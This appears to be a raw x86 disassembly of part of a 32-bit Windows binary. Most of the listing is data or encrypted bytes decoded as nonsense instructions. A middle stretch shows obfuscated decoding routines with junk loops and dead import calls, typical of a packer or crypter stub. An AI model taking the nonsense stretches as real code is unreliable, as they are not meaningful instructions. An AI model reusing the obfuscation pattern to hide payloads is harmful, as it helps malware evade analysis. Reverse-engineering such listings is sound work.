  40f39a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f39b:	pop    edx
  40f39c:	out    0x9c,al
  40f39e:	sub    al,0x37
  40f3a0:	mov    eax,ds:0x91676ee
  40f3a5:	sbb    DWORD PTR [ebp+0x70],esp
  40f3a8:	cmp    BYTE PTR [ecx+0x67682371],ch
  40f3ae:	jo     0x40f3f9
  40f3b0:	or     DWORD PTR [edi],0x525915f6
  40f3b6:	pop    ebx
  40f3b7:	ss mov ah,0xa0
  40f3ba:	leave  
  40f3bb:	in     al,0xd5
  40f3bd:	ret    
  40f3be:	(bad)  
  40f3bf:	lods   eax,DWORD PTR cs:[esi]
  40f3c1:	jns    0x40f3eb
  40f3c3:	repnz or edi,DWORD PTR [ecx]
  40f3c6:	push   0xffffffbb
  40f3c8:	cmc    
  40f3c9:	test   DWORD PTR [ecx+eiz*2+0x597d3b67],0x345210b4
  40f3d4:	cli    
  40f3d5:	sub    esi,DWORD PTR [ebx]
  40f3d7:	leave  
  40f3d8:	(bad)  
  40f3d9:	in     eax,0x33
  40f3db:	push   cs
  40f3dc:	addr16 or ecx,ecx
  40f3df:	ds inc esi
  40f3e1:	or     ebp,eax
  40f3e3:	push   ecx
  40f3e4:	fisub  DWORD PTR [edx+0x31]
  40f3e7:	adc    DWORD PTR [esi],0xffffffa3
  40f3ea:	(bad)  
  40f3eb:	pop    edi
  40f3ec:	sub    eax,0x8e9755bf
  40f3f1:	inc    BYTE PTR [eax]
  40f3f3:	icebp  
  40f3f4:	out    0xe8,al
  40f3f6:	sbb    ebx,DWORD PTR [edx-0x22]
  40f3f9:	mov    ah,BYTE PTR [ecx]
  40f3fb:	ss push 0x7076dee
  40f401:	ins    DWORD PTR es:[edi],dx
  40f402:	jno    0x40f463
  40f404:	arpl   WORD PTR ds:0xc076e4ba,bx
  40f40a:	call   FWORD PTR [ebx-0x2a707dd9]
  40f410:	xor    al,dh
  40f412:	int    0x8
  40f414:	cmp    eax,0xcf0e7862
  40f419:	idiv   BYTE PTR ds:0x16f1b606
  40f41f:	mov    cs,WORD PTR [ebp-0x6969135e]
  40f425:	iret   
  40f426:	lods   al,BYTE PTR ds:[esi]
  40f427:	adc    eax,0xfdd19f87
  40f42c:	xor    ebx,DWORD PTR [esi]
  40f42e:	mov    bl,0xd6
  40f430:	test   BYTE PTR [edi+0x25],cl
  40f433:	cmc    
  40f434:	jb     0x40f3e8
  40f436:	and    bl,dl
  40f438:	mov    cs,WORD PTR [ebx+0x5068bef8]
  40f43e:	or     BYTE PTR [esi+0x6],dh
  40f441:	mov    dh,0xeb
  40f443:	mov    al,ds:0xce9a2d8d
  40f448:	clc    
  40f449:	retf   0x813e
  40f44c:	push   0x9a06932a
  40f451:	xchg   ebp,eax
  40f452:	gs aas 
  40f454:	fimul  DWORD PTR [ebx-0x74]
  40f457:	xchg   BYTE PTR [ebx],dl
  40f459:	div    edx
  40f45b:	pop    esi
  40f45c:	push   ebx
  40f45d:	and    BYTE PTR [ecx+0x5bfbef87],al
  40f463:	pop    es
  40f464:	fld    TBYTE PTR [eax+0x13]
  40f467:	test   BYTE PTR [eax],bl
  40f469:	and    DWORD PTR [ebx-0x3f30ecb2],ebx
  40f46f:	jnp    0x40f4c5
  40f471:	fwait
  40f472:	cmp    bl,BYTE PTR [esi-0x5e]
  40f475:	aam    0x21
  40f477:	scas   eax,DWORD PTR es:[edi]
  40f478:	adc    esp,edi
  40f47a:	fadd   DWORD PTR [ecx]
  40f47c:	pushf  
  40f47d:	jecxz  0x40f4c8
  40f47f:	sbb    BYTE PTR [ebx],ch
  40f481:	mov    ds:0xef683678,eax
  40f486:	adc    ebx,DWORD PTR ds:[esi]
  40f489:	fcomp  QWORD PTR [edi+0x1eff626d]
  40f48f:	inc    edi
  40f490:	fwait
  40f491:	inc    ecx
  40f492:	mov    eax,0xca7c42f3
  40f497:	lea    ebx,[edi+0x4a083f7e]
  40f49d:	sbb    al,0x96
  40f49f:	test   dh,bl
  40f4a1:	or     ch,ah
  40f4a3:	push   ds
  40f4a4:	push   ecx
  40f4a5:	fistp  DWORD PTR [ebx]
  40f4a7:	and    DWORD PTR [ecx+eax*1-0x5e],ebx
  40f4ab:	jne    0x40f438
  40f4ad:	cmp    al,0xd1
  40f4af:	stc    
  40f4b0:	xchg   BYTE PTR [ebx-0x6208378a],dh
  40f4b6:	pusha  
  40f4b7:	icebp  
  40f4b8:	iret   
  40f4b9:	jno    0x40f51f
  40f4bb:	cdq    
  40f4bc:	mov    al,ds:0xea09c4af
  40f4c1:	mov    ebx,0x8dceec53
  40f4c6:	rcl    DWORD PTR [esi+0x4fbf3b74],cl
  40f4cc:	fs inc eax
  40f4ce:	call   0x89fbd989
  40f4d3:	push   edx
  40f4d4:	jle    0x40f532
  40f4d6:	stc    
  40f4d7:	fwait
  40f4d8:	mov    al,cl
  40f4da:	cmp    ebp,DWORD PTR [ebx-0x712c932e]
  40f4e0:	cmp    esp,DWORD PTR [ebx-0x446b31b5]
  40f4e6:	ja     0x40f4d6
  40f4e8:	inc    esp
  40f4e9:	(bad)  
  40f4ea:	sub    al,0x6b
  40f4ec:	cmp    al,0x89
  40f4ee:	push   cs
  40f4ef:	loope  0x40f4a3
  40f4f1:	fsub   DWORD PTR [ecx+0x18b2f253]
  40f4f7:	adc    eax,0xc6d0143c
  40f4fc:	cmp    al,0x5b
  40f4fe:	push   bp
  40f500:	jge    0x40f555
  40f502:	sub    ecx,DWORD PTR [ecx-0x2a82c74d]
  40f508:	mov    ah,0x4a
  40f50a:	dec    edi
  40f50b:	xchg   esi,eax
  40f50c:	xchg   esp,eax
  40f50d:	ins    BYTE PTR es:[edi],dx
  40f50e:	add    BYTE PTR [ebx-0x25f0c2d3],cl
  40f514:	add    al,0x5
  40f516:	sbb    al,0x24
  40f518:	sbb    WORD PTR [ecx+0x182f7eaa],cx
  40f51f:	mov    dh,0xcf
  40f521:	cmp    ebx,DWORD PTR [eax*2+0x4df15548]
  40f528:	lods   al,BYTE PTR ds:[esi]
  40f529:	xor    esi,DWORD PTR ds:0x78b50035
  40f52f:	(bad)  [eax+0x9626925]
  40f535:	fisubr WORD PTR [esi+0x35]
  40f538:	pop    es
  40f539:	adc    al,0x4c
  40f53b:	jp     0x40f5b2
  40f53d:	jg     0x40f4d6
  40f53f:	in     al,dx
  40f540:	pop    esp
  40f541:	aas    
  40f542:	stc    
  40f543:	in     eax,0x2b
  40f545:	mov    DWORD PTR [edx-0x68],eax
  40f548:	test   DWORD PTR [ebp+0x6106d92b],ebp
  40f54e:	dec    ebx
  40f54f:	rcr    dl,cl
  40f551:	inc    esi
  40f552:	fisubr WORD PTR [eax+0x4a]
  40f555:	bound  ebx,QWORD PTR [ebp-0x79]
  40f558:	in     eax,0x98
  40f55a:	and    esi,DWORD PTR ds:0x193b6c72
  40f560:	je     0x40f505
  40f562:	jmp    0x40f4f8
  40f564:	gs std 
  40f566:	retf   0xae89
  40f569:	cli    
  40f56a:	or     DWORD PTR ds:0x53d18d5c,edi
  40f570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f571:	mov    bl,ch
  40f573:	out    dx,eax
  40f574:	mov    al,ds:0xf4a8d0b7
  40f579:	popa   
  40f57a:	mov    ah,0x17
  40f57c:	pop    eax
  40f57d:	cmp    BYTE PTR [edi-0x65],al
  40f580:	aaa    
  40f581:	stos   BYTE PTR es:[edi],al
  40f582:	popf   
  40f583:	push   ds
  40f584:	test   BYTE PTR [edi],bl
  40f586:	inc    esi
  40f587:	aas    
  40f588:	call   0x6c91:0x88f4cb62
  40f58f:	jp     0x40f5e9
  40f591:	mov    ds:0x5f5230cc,eax
  40f596:	out    dx,al
  40f597:	adc    bl,BYTE PTR [ebx+edi*1-0x6f]
  40f59b:	pop    ebp
  40f59c:	pop    ebx
  40f59d:	cs test al,0x20
  40f5a0:	pop    es
  40f5a1:	sbb    edi,ebx
  40f5a3:	sub    eax,0x51fadac0
  40f5a8:	gs add al,0x5d
  40f5ab:	in     eax,dx
  40f5ac:	imul   ebp,DWORD PTR [edi+0x7370050e]
  40f5b3:	aaa    
  40f5b4:	in     eax,dx
  40f5b5:	dec    edx
  40f5b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5b7:	test   BYTE PTR [eax],al
  40f5b9:	jle    0x40f55d
  40f5bb:	cmp    eax,0x3a2b5449
  40f5c0:	pop    ebx
  40f5c1:	add    dh,BYTE PTR es:[ecx]
  40f5c4:	adc    al,0x3b
  40f5c6:	jae    0x40f5e2
  40f5c8:	cdq    
  40f5c9:	lds    esi,FWORD PTR [eax]
  40f5cb:	cmp    BYTE PTR [edi+0x75],ch
  40f5ce:	aaa    
  40f5cf:	mov    bl,0xe1
  40f5d1:	(bad)  
  40f5d2:	adc    al,0xc7
  40f5d4:	jbe    0x40f585
  40f5d6:	gs lahf 
  40f5d8:	das    
  40f5d9:	shl    BYTE PTR [eax-0x13],0x3
  40f5dd:	out    dx,eax
  40f5de:	sub    ebp,ecx
  40f5e0:	mov    DWORD PTR [eax+0x1a374318],eax
  40f5e6:	xchg   edx,eax
  40f5e7:	or     DWORD PTR [ecx-0x2f],ebx
  40f5ea:	and    cl,BYTE PTR [ebp-0x5f3b8526]
  40f5f0:	inc    DWORD PTR [esp+ebp*2]
  40f5f3:	dec    edx
  40f5f4:	pop    ebp
  40f5f5:	and    eax,0x2bbe03b
  40f5fa:	lahf   
  40f5fb:	retf   0x639
  40f5fe:	aad    0x8e
  40f600:	sar    BYTE PTR [edi-0xf],0x1c
  40f604:	ret    0xd6f7
  40f607:	(bad)  
  40f608:	ins    BYTE PTR es:[edi],dx
  40f609:	sub    eax,0x35c0476a
  40f60e:	neg    DWORD PTR [ecx+0x39]
  40f611:	and    dl,ch
  40f613:	fimul  WORD PTR [ebx]
  40f615:	fdiv   DWORD PTR [esi]
  40f617:	push   0x18169cde
  40f61c:	in     al,dx
  40f61d:	pop    ebp
  40f61e:	mov    cl,0xcc
  40f620:	sbb    al,0x69
  40f622:	out    dx,eax
  40f623:	or     dh,bl
  40f625:	jmp    0x40f5cc
  40f627:	and    eax,0x35972c1c
  40f62c:	dec    DWORD PTR [ecx+edi*2-0x19e9fbd4]
  40f633:	rcr    BYTE PTR [ebp+0x4d788a88],cl
  40f639:	and    cl,BYTE PTR [edx]
  40f63b:	test   al,0x9a
  40f63d:	inc    esp
  40f63e:	pop    ebp
  40f63f:	(bad)  
  40f640:	pop    ebp
  40f641:	dec    ebx
  40f642:	(bad)  
  40f643:	xor    eax,0xfd5ba317
  40f648:	jb     0x40f5ec
  40f64a:	push   ds
  40f64b:	mov    edi,0xd2a30820
  40f650:	xchg   BYTE PTR cs:[eax+0x53e57a0b],al
  40f657:	les    ecx,FWORD PTR [edi+0x42]
  40f65a:	add    bh,BYTE PTR [esi-0x3416b1bd]
  40f660:	dec    esp
  40f661:	mov    al,0x81
  40f663:	sti    
  40f664:	out    0xd9,eax
  40f666:	je     0x40f6a9
  40f668:	inc    edi
  40f669:	dec    ecx
  40f66a:	(bad)  
  40f66c:	gs dec eax
  40f66e:	shr    BYTE PTR [edi+0x52],1
  40f671:	mov    edi,0x28a88f15
  40f676:	jmp    0x46b35e34
  40f67b:	addr16 push esi
  40f67d:	nop
  40f67e:	icebp  
  40f67f:	jne    0x40f6a8
  40f681:	mov    bh,0x85
  40f683:	popf   
  40f684:	in     al,0xda
  40f686:	jmp    0x229c:0x75ffd8f9
  40f68d:	pop    ecx
  40f68e:	imul   eax,DWORD PTR [edi],0xe0dd56e5
  40f694:	loopne 0x40f686
  40f696:	and    eax,0x1eb5b475
  40f69b:	add    BYTE PTR [ebx],ch
  40f69d:	xlat   BYTE PTR ds:[ebx]
  40f69e:	cmp    DWORD PTR es:[ebx],edi
  40f6a1:	or     dh,al
  40f6a3:	les    ebx,FWORD PTR ds:0x863d6687
  40f6a9:	jecxz  0x40f6a8
  40f6ab:	cdq    
  40f6ac:	mov    bl,0xe9
  40f6ae:	add    al,0x99
  40f6b0:	jno    0x40f705
  40f6b2:	cmp    al,0x43
  40f6b4:	xchg   edi,eax
  40f6b5:	mov    eax,0xad1883d8
  40f6ba:	add    al,0xbd
  40f6bc:	pop    ebx
  40f6bd:	out    0xec,al
  40f6bf:	das    
  40f6c0:	jnp    0x40f6bd
  40f6c2:	jge    0x40f71f
  40f6c4:	test   al,0x1f
  40f6c6:	hlt    
  40f6c7:	outs   dx,BYTE PTR ds:[esi]
  40f6c8:	mov    ds:0xffd8685,al
  40f6cd:	xor    ecx,DWORD PTR [edi+ecx*4-0x3e]
  40f6d1:	sub    ah,BYTE PTR [eax]
  40f6d3:	sti    
  40f6d4:	stc    
  40f6d5:	dec    esp
  40f6d6:	ja     0x40f6de
  40f6d8:	das    
  40f6d9:	aaa    
  40f6da:	fld    DWORD PTR [edx+0x36]
  40f6dd:	mov    cl,0xc4
  40f6df:	add    ebx,esp
  40f6e1:	pop    ds
  40f6e2:	and    BYTE PTR [edi+edx*4+0x1f],0x94
  40f6e7:	repz mov eax,0x5abbf359
  40f6ed:	test   eax,0x3d1f9ed8
  40f6f2:	pop    eax
  40f6f3:	jecxz  0x40f678
  40f6f5:	inc    eax
  40f6f6:	sub    al,0x57
  40f6f8:	aaa    
  40f6f9:	fbstp  TBYTE PTR [eax-0x27]
  40f6fc:	cmp    dh,dh
  40f6fe:	xchg   edi,eax
  40f6ff:	stc    
  40f700:	inc    ecx
  40f701:	je     0x40f699
  40f703:	lahf   
  40f704:	cs push ss
  40f706:	adc    DWORD PTR [ebp-0x1a7fab8f],edi
  40f70c:	shr    DWORD PTR [ebx-0x75],1
  40f70f:	pop    ebx
  40f710:	xchg   edx,eax
  40f711:	test   DWORD PTR ds:0x57235860,ebp
  40f717:	sbb    BYTE PTR [eax+0x73],bh
  40f71a:	pushf  
  40f71b:	push   es
  40f71c:	mul    esi
  40f71e:	xchg   edx,eax
  40f71f:	sub    BYTE PTR [ecx+0xc065ef6],dl
  40f725:	xchg   DWORD PTR [ecx-0x1712cc08],esp
  40f72b:	mov    esi,0x7eff1b5c
  40f730:	push   esp
  40f731:	je     0x40f6c7
  40f733:	cmp    bh,bh
  40f735:	fwait
  40f736:	inc    eax
  40f737:	cmp    esi,DWORD PTR [ebp-0xb65ae4c]
  40f73d:	test   al,0xa5
  40f73f:	std    
  40f740:	(bad)  
  40f741:	loopne 0x40f6e3
  40f743:	mov    fs,edi
  40f745:	retf   0x8727
  40f748:	sti    
  40f749:	ja     0x40f7ac
  40f74b:	enter  0x7e3e,0xa8
  40f74f:	push   esi
  40f750:	test   eax,0x8901b850
  40f755:	adc    BYTE PTR [ebp+0x4ce0bb55],bl
  40f75b:	mov    ch,0x32
  40f75d:	xchg   esp,eax
  40f75e:	aaa    
  40f75f:	dec    ebp
  40f760:	sbb    edi,ecx
  40f762:	sbb    al,0xdf
  40f764:	jb     0x40f74d
  40f766:	lock jecxz 0x40f7d6
  40f769:	jno    0x40f710
  40f76b:	push   0xdbee771d
  40f770:	or     BYTE PTR [ecx+0x781a78c2],dh
  40f776:	es dec esi
  40f778:	in     al,dx
  40f779:	data16 sbb BYTE PTR [edi-0x26],0x25
  40f77e:	and    dh,bh
  40f780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f781:	imul   esi,DWORD PTR [eax-0x7d],0x69c0331b
  40f788:	and    BYTE PTR [edx-0x60],bh
  40f78b:	(bad)  
  40f78c:	xchg   edx,eax
  40f78d:	jp     0x40f7f2
  40f78f:	dec    eax
  40f790:	mov    dl,0x9e
  40f792:	mov    ebp,0xe7b1e5ad
  40f797:	ins    BYTE PTR es:[edi],dx
  40f798:	mov    bl,0x2f
  40f79a:	repz lds edx,FWORD PTR fs:[eax-0x42]
  40f79f:	ror    ch,0x23
  40f7a2:	jl     0x40f7cb
  40f7a4:	ret    0x7a43
  40f7a7:	clc    
  40f7a8:	call   0xed00264c
  40f7ad:	xchg   edx,eax
  40f7ae:	add    dh,BYTE PTR [ebp+0x10d0b7e0]
  40f7b4:	adc    DWORD PTR [ecx+esi*8],edi
  40f7b7:	jecxz  0x40f81a
  40f7b9:	js     0x40f830
  40f7bb:	xchg   edx,eax
  40f7bc:	pop    ss
  40f7bd:	mov    bl,0xda
  40f7bf:	push   ecx
  40f7c0:	pop    edx
  40f7c1:	push   edi
  40f7c2:	mov    WORD PTR [ebp-0x76],?
  40f7c5:	aas    
  40f7c6:	pop    esp
  40f7c7:	(bad)  
  40f7c8:	std    
  40f7c9:	and    BYTE PTR [ecx],dl
  40f7cb:	aaa    
  40f7cc:	xchg   BYTE PTR [esp+edx*2+0x152eb1cf],ch
  40f7d3:	xchg   edi,eax
  40f7d4:	sub    eax,0xde473903
  40f7d9:	dec    eax
  40f7da:	mov    ebp,0xfb2456d0
  40f7df:	mov    edx,0x2e7789e5
  40f7e4:	mov    eax,0x534afc39
  40f7e9:	xor    eax,0x5631b973
  40f7ee:	cwde   
  40f7ef:	and    esi,esi
  40f7f1:	iret   
  40f7f2:	adc    cl,bl
  40f7f4:	aad    0x30
  40f7f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f7:	xchg   ebp,eax
  40f7f8:	jge    0x40f7c7
  40f7fa:	lds    eax,FWORD PTR [eax-0xb]
  40f7fd:	or     ebx,DWORD PTR [eax]
  40f7ff:	dec    ecx
  40f800:	sbb    al,0xc4
  40f802:	xlat   BYTE PTR es:[ebx]
  40f804:	sub    al,BYTE PTR [eax]
  40f806:	pop    es
  40f807:	js     0x40f87c
  40f809:	add    eax,0xb036c13c
  40f80e:	adc    al,0xd0
  40f810:	xchg   edx,eax
  40f811:	shl    BYTE PTR [edi],1
  40f813:	pop    ecx
  40f814:	push   esi
  40f815:	mov    ebp,0x229fd58
  40f81a:	cmp    al,0x1d
  40f81c:	inc    ecx
  40f81d:	sub    al,0x10
  40f81f:	dec    ebx
  40f820:	pushw  0xffb8
  40f823:	dec    ebp
  40f824:	pop    esi
  40f825:	loope  0x40f7f5
  40f827:	push   ecx
  40f828:	fdivr  st(2),st
  40f82a:	and    BYTE PTR [esi-0x2a],bl
  40f82d:	mov    WORD PTR [ecx+0x523a4b56],?
  40f833:	mov    edx,0xe6c3c81e
  40f838:	(bad)  
  40f839:	sar    DWORD PTR [ebx-0x77b47661],1
  40f83f:	xchg   ebp,eax
  40f840:	rcr    ah,cl
  40f842:	(bad)  
  40f844:	cmp    edi,edi
  40f846:	test   al,0x49
  40f848:	push   ecx
  40f849:	pop    edx
  40f84a:	pop    edx
  40f84b:	scas   eax,DWORD PTR es:[edi]
  40f84c:	jmp    0x677d:0x99b4e84a
  40f853:	mov    eax,0x49914891
  40f858:	xchg   ecx,edx
  40f85a:	dec    edx
  40f85b:	push   edx
  40f85c:	mov    edx,ebx
  40f85e:	pop    ebx
  40f85f:	dec    ebx
  40f860:	call   DWORD PTR [ebx]
  40f862:	cmp    DWORD PTR [ebp+0x10],esi
  40f865:	je     0x40f884
  40f86b:	xchg   edx,eax
  40f86c:	push   0xb
  40f86e:	pop    ecx
  40f86f:	push   0x4
  40f871:	pop    ebx
  40f872:	inc    ebx
  40f873:	xchg   ebx,ecx
  40f875:	sub    ebx,ecx
  40f877:	xchg   ebx,ecx
  40f879:	dec    ecx
  40f87a:	dec    ecx
  40f87b:	mov    eax,DWORD PTR [ebp-0x1c]
  40f87e:	imul   eax,ecx
  40f881:	add    esp,eax
  40f883:	xchg   edx,eax
  40f884:	push   eax
  40f885:	xor    ebx,ebx
  40f887:	mov    edx,esp
  40f889:	dec    edx
  40f88a:	inc    ebx
  40f88b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f88e:	dec    ebx
  40f88f:	xor    edx,edx
  40f891:	add    DWORD PTR [ebp-0xc],ebx
  40f894:	pop    ebx
  40f895:	mov    eax,DWORD PTR [ebp-0xc]
  40f898:	pop    edi
  40f899:	pop    esi
  40f89a:	pop    ebx
  40f89b:	leave  
  40f89c:	ret    0x10
  40f89f:	push   ebp
  40f8a0:	mov    ebp,esp
  40f8a2:	push   ecx
  40f8a3:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  40f8aa:	add    DWORD PTR ds:0x42c010,0x33e6
  40f8b4:	mov    eax,DWORD PTR [ebp-0x4]
  40f8b7:	or     edx,ecx
  40f8b9:	mov    edx,DWORD PTR [ebp+0x10]
  40f8bc:	mov    ecx,0x7510893
  40f8c1:	xor    eax,ecx
  40f8c3:	and    DWORD PTR ds:0x42d008,0x1b89
  40f8cd:	add    eax,0x3272db
  40f8d2:	or     DWORD PTR ds:0x42a01c,0x429008
  40f8dc:	mov    DWORD PTR [edx],eax
  40f8de:	and    DWORD PTR ds:0x42c01c,0x0
  40f8e8:	xor    eax,eax
  40f8ea:	add    eax,DWORD PTR ds:0x42c01c
  40f8f0:	inc    eax
  40f8f1:	mov    ds:0x42c01c,eax
  40f8f6:	cmp    DWORD PTR ds:0x42c01c,0x28
  40f8fd:	jne    0x40f90f
  40f903:	push   DWORD PTR [ebp-0x20]
  40f906:	push   DWORD PTR [ebp-0x20]
  40f909:	call   DWORD PTR ds:0x425034
  40f90f:	cmp    DWORD PTR ds:0x42c01c,0x1d
  40f916:	jb     0x40f8e8
  40f91c:	and    DWORD PTR ds:0x42d01c,0x0
  40f926:	jmp    0x40f938
  40f92b:	mov    edx,DWORD PTR ds:0x42d01c
  40f931:	inc    edx
  40f932:	mov    DWORD PTR ds:0x42d01c,edx
  40f938:	cmp    DWORD PTR ds:0x42d01c,0x1b
  40f93f:	jae    0x40f96c
  40f945:	cmp    DWORD PTR ds:0x42d01c,0x1d
  40f94c:	jne    0x40f967
  40f952:	push   0x42457a
  40f957:	push   0x42452a
  40f95c:	push   0x42c7
  40f961:	call   DWORD PTR ds:0x42503c
  40f967:	jmp    0x40f92b
  40f96c:	mov    eax,DWORD PTR [ebp+0xc]
  40f96f:	xor    eax,ecx
  40f971:	push   esi
  40f972:	mov    esi,DWORD PTR [ebp+0x10]
  40f975:	mov    edx,0x3272db
  40f97a:	add    eax,edx
  40f97c:	mov    DWORD PTR [esi+0x4],eax
  40f97f:	mov    eax,DWORD PTR [ebp+0x14]
  40f982:	mov    esi,DWORD PTR [ebp+0x10]
  40f985:	mov    DWORD PTR [esi+0x8],eax
  40f988:	mov    eax,DWORD PTR [ebp+0x18]
  40f98b:	mov    esi,DWORD PTR [ebp+0x10]
  40f98e:	mov    DWORD PTR [esi+0xc],eax
  40f991:	mov    eax,DWORD PTR [ebp+0x1c]
  40f994:	mov    esi,DWORD PTR [ebp+0x10]
  40f997:	mov    DWORD PTR [esi+0x10],eax
  40f99a:	mov    eax,DWORD PTR [ebp+0x8]
  40f99d:	xor    eax,ecx
  40f99f:	add    eax,edx
  40f9a1:	pop    esi
  40f9a2:	leave  
  40f9a3:	ret    0x18
  40f9a6:	push   ebp
  40f9a7:	mov    ebp,esp
  40f9a9:	mov    eax,ds:0x424020
  40f9ae:	mov    eax,DWORD PTR [eax+0x1c8]
  40f9b4:	mov    eax,DWORD PTR [eax]
  40f9b6:	movzx  ecx,BYTE PTR ds:0x429000
  40f9bd:	and    DWORD PTR ds:0x42d010,ecx
  40f9c3:	cdq    
  40f9c4:	push   ebx
  40f9c5:	add    DWORD PTR ds:0x42a008,0x429020
  40f9cf:	mov    ecx,0xfabdbef1
  40f9d4:	add    eax,ecx
  40f9d6:	mov    DWORD PTR ds:0x42d008,0x7e66
  40f9e0:	adc    edx,0xffffffff
  40f9e3:	or     DWORD PTR ds:0x42a014,edi
  40f9e9:	push   esi
  40f9ea:	push   edi
  40f9eb:	and    DWORD PTR ds:0x42a00c,0x0
  40f9f5:	jmp    0x40fa09
  40f9fa:	xor    ebx,ebx
  40f9fc:	or     ebx,DWORD PTR ds:0x42a00c
  40fa02:	inc    ebx
  40fa03:	mov    DWORD PTR ds:0x42a00c,ebx
  40fa09:	cmp    DWORD PTR ds:0x42a00c,0x1b
  40fa10:	jae    0x40fa41
  40fa16:	cmp    DWORD PTR ds:0x42a00c,0x26
  40fa1d:	jne    0x40fa36
  40fa23:	push   0x7619
  40fa28:	push   0x3c20
  40fa2d:	push   DWORD PTR [ebp-0x18]
  40fa30:	call   DWORD PTR ds:0x425040
  40fa36:	jmp    0x40f9fa
  40fa3b:	adc    ebx,DWORD PTR ds:0x42d018
  40fa41:	mov    edi,edx
  40fa43:	mov    edx,DWORD PTR [ebp+0x8]
  40fa46:	mov    DWORD PTR ds:0x42c000,0x5718
  40fa50:	mov    ebx,eax
  40fa52:	and    DWORD PTR ds:0x42c004,0x67ab
  40fa5c:	mov    eax,0x8a29a123
  40fa61:	xor    esi,esi
  40fa63:	or     DWORD PTR ds:0x429024,0x42d014
  40fa6d:	xor    ebx,eax
  40fa6f:	or     DWORD PTR ds:0x42d000,0x42a014
  40fa79:	xor    edi,0x0
  40fa7c:	and    DWORD PTR ds:0x42d000,0x42a00c
  40fa86:	add    edx,ecx
  40fa88:	adc    esi,0xffffffff
  40fa8b:	xor    edx,eax
  40fa8d:	or     DWORD PTR ds:0x42c010,0x42b010
  40fa97:	jmp    0x411e4e
  40fa9c:	mov    WORD PTR [ebx+0x6643964b],?
  40faa2:	arpl   WORD PTR [ebx+0x42],sp
  40faa5:	jno    0x40fa92
  40faa7:	rol    BYTE PTR [ebp+0x6e],cl
  40faaa:	dec    ebp
  40faab:	fs js  0x40fa3c
  40faae:	bound  esp,QWORD PTR [edx-0x38]
  40fab1:	pop    edi
  40fab2:	bound  esp,QWORD PTR [edx+0x0]
  40fab5:	je     0x40fa76
  40fab7:	js     0x40fa4d
  40fab9:	retf   0x691d
  40fabc:	push   edi
  40fabd:	outs   dx,DWORD PTR ds:[esi]
  40fabe:	mov    eax,ds:0xaeb632c
  40fac3:	mov    bh,0x2
  40fac5:	fcom   QWORD PTR [ebx-0x21e25073]
  40facb:	inc    eax
  40facc:	mov    DWORD PTR [eax-0x13],eax
  40facf:	stos   DWORD PTR es:[edi],eax
  40fad0:	retf   
  40fad1:	xor    BYTE PTR [edi+0x68820a4e],al
  40fad7:	add    al,dh
  40fad9:	mov    ds:0x73535b40,al
  40fade:	mov    eax,0x898aab1
  40fae3:	and    DWORD PTR ds:0x213f976a,edx
  40fae9:	jno    0x40fb53
  40faeb:	push   edx
  40faec:	outs   dx,BYTE PTR ds:[esi]
  40faed:	dec    edx
  40faee:	cli    
  40faef:	lods   al,BYTE PTR ds:[esi]
  40faf0:	shl    BYTE PTR [edx-0x2e783d06],1
  40faf6:	pop    ecx
  40faf7:	fs adc al,0x9d
  40fafa:	push   ss
  40fafb:	std    
  40fafc:	loopne 0x40fb40
  40fafe:	cmp    dh,bh
  40fb00:	dec    edx
  40fb01:	sar    BYTE PTR [edx-0x7aee8434],cl
  40fb07:	mov    eax,ds:0xd43fb7d
  40fb0d:	pop    ds
  40fb0e:	jne    0x40fb72
  40fb10:	push   ecx
  40fb11:	push   es
  40fb12:	in     eax,0x75
  40fb14:	xor    DWORD PTR [ecx-0x55],esp
  40fb17:	xchg   DWORD PTR [ecx+0x2a],esp
  40fb1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb1b:	mov    al,ds:0xd1aabff2
  40fb20:	data16 jne 0x40fad7
  40fb23:	scas   eax,DWORD PTR es:[edi]
  40fb24:	inc    esi
  40fb25:	js     0x40fabd
  40fb27:	cmc    
  40fb28:	adc    BYTE PTR [edi+0x20],al
  40fb2b:	mov    dl,0xa9
  40fb2d:	and    DWORD PTR [esi+0x6],esp
  40fb30:	push   esp
  40fb31:	mov    BYTE PTR [ebp+0x6323d43f],al
  40fb37:	cmp    DWORD PTR [ebx-0x68],eax
  40fb3a:	xchg   esp,eax
  40fb3b:	jbe    0x40fb2f
  40fb3d:	shr    DWORD PTR [edi],1
  40fb3f:	adc    al,0xe9
  40fb41:	imul   ebp,DWORD PTR [edx-0x57],0xa7e52937
  40fb48:	adc    DWORD PTR [edi-0x5b],esi
  40fb4b:	daa    
  40fb4c:	xchg   DWORD PTR [ebx],ebx
  40fb4e:	and    BYTE PTR [edx],bh
  40fb50:	and    dl,BYTE PTR [edi]
  40fb52:	mov    ecx,0x6745db93
  40fb57:	fisub  DWORD PTR [edx]
  40fb59:	sub    ecx,DWORD PTR [eax-0xc16281d]
  40fb5f:	dec    ebp
  40fb60:	xor    edi,0x970509c7
  40fb66:	mov    cl,0x89
  40fb68:	and    ebx,ebx
  40fb6a:	xor    DWORD PTR [ebx+0x667836b5],ecx
  40fb70:	sub    eax,esi
  40fb72:	repnz fbstp TBYTE PTR [edi-0x3c]
  40fb76:	push   cs
  40fb77:	inc    ebp
  40fb78:	js     0x40fb37
  40fb7a:	(bad)  
  40fb7c:	mov    ax,0xa264
  40fb80:	pop    esp
  40fb81:	jno    0x40fb57
  40fb83:	mov    dl,0xee
  40fb85:	not    BYTE PTR [ebx]
  40fb87:	lods   eax,DWORD PTR ds:[esi]
  40fb88:	test   al,0x9b
  40fb8a:	cmc    
  40fb8b:	(bad)  
  40fb8c:	mov    ebx,0x9973e004
  40fb91:	jp     0x40fb6b
  40fb93:	adc    esi,DWORD PTR [esi]
  40fb95:	xchg   edx,eax
  40fb96:	fucomip st,st(1)
  40fb98:	in     eax,0xdf
  40fb9a:	push   ebx
  40fb9b:	dec    esi
  40fb9c:	enter  0xf651,0x33
  40fba0:	dec    edi
  40fba1:	sub    DWORD PTR [edx],eax
  40fba3:	sahf   
  40fba4:	mov    edx,0x6f1b09a4
  40fba9:	cli    
  40fbaa:	in     al,0x1c
  40fbac:	fcomip st,st(0)
  40fbae:	or     eax,0xf6d19167
  40fbb3:	ror    BYTE PTR ds:0xdf3bcd5b,cl
  40fbb9:	in     eax,0x7c
